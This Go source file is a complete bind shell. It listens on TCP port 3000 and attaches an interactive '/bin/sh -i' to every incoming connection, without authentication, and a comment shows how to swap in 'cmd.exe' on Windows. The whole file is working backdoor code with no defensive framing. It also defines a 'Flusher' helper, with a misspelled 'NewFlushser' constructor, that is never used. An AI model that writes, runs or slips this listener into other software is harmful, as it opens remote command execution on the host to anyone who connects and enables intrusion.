package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

type Flusher struct {
	w *bufio.Writer
}

func NewFlushser(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w)}
}

func (f *Flusher) Write(b []byte) (int, error) {
	count, err := f.w.Write(b)

	if err != nil {
		return -1, err
	}
	if err := f.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}

func handle(conn net.Conn) {

	/*
	 * Explicitly calling /bin/sh and using -i for interactive mode
	 * so that we can use it for stdin and stdout.
	 * For Windows use exec.Command("cmd.exe")
	 */
	//cmd := exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)

	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}

	conn.Close()
}

func main() {

	port := 3000
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))

	if err != nil {
		log.Fatalf("Unable to bind port: %v", err)
	}
	fmt.Println("Server listening on port:", port)
	for {
		conn, err := listener.Accept()

		if err != nil {
			fmt.Printf("Accepting connection failure: %v", err)
			continue
		}
		go handle(conn)
	}
}
